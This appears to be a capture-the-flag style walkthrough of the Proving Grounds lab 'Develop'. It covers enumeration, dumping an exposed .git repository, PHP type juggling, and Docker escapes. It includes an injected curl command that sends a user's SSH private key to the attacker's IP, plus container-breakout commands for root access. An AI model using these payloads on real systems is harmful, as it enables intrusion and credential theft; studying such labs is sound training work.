---
title: Develop
date: 2026-06-25T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - gobuster
  - git
  - docker
  - gitdumper
  - whatweb
  - linpeas
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Develop"
---

 "Austria! Well then… G’day mate!" 
— Dumb and Dumber

`nmap 192.168.182.135 -p- -Pn --min-rate 5000`

![](Screenshot%202026-06-26%20at%2008.33.30.png)

![](Screenshot%202026-06-26%20at%2008.29.53.png)

gobuster dir -u http://192.168.182.135  -w /usr/share/wordlists/dirb/common.txt

![](Screenshot%202026-06-26%20at%2008.35.53.png)

![](Screenshot%202026-06-26%20at%2008.35.27.png)

![](Screenshot%202026-06-26%20at%2009.55.35.png)

Gitdumper:

`git clone https://github.com/arthaud/git-dumper.git`

`python -m venv .venv`  
`source .venv/bin/activate`  
`pip3 install -r requirements.txt`

`python git_dumper.py http://192.168.182.135/.git/ ../`

![](Screenshot%202026-06-26%20at%2010.19.27.png)

![](Screenshot%202026-06-26%20at%2010.23.40.png)

![](Screenshot%202026-06-26%20at%2010.29.14.png)

`git log -p -5`

![](Screenshot%202026-06-26%20at%2013.35.27.png)

Hashcat and john got nowhere.

Php type juggling and magic hash:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md  
https://github.com/spaze/hashes/blob/master/md5.md

![](Screenshot%202026-06-26%20at%2013.39.03.png)

![](Screenshot%202026-06-26%20at%2013.32.34.png)

![](Screenshot%202026-06-26%20at%2013.40.50.png)

![](Screenshot%202026-06-26%20at%2014.36.30.png)

`127.0.0.1;curl${IFS}-X${IFS}POST${IFS}-F${IFS}"file=@/home/franz/.ssh/id_rsa"${IFS}http://192.168.45.162`

![](Screenshot%202026-06-26%20at%2014.35.26.png)

![](Screenshot%202026-06-26%20at%2014.34.29.png)

![](Screenshot%202026-06-26%20at%2014.39.07.png)

Linpeas:

![](Screenshot%202026-06-26%20at%2016.26.22.png)

Docker escape:  
https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation

`docker run -it -v /:/host/ d4c3cafb11d5 chroot /host/ bash`

![](Screenshot%202026-06-26%20at%2015.10.37.png)

`docker run -it --rm --pid=host --privileged d4c3cafb11d5  bash`  
`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

![](Screenshot%202026-06-26%20at%2016.21.56.png)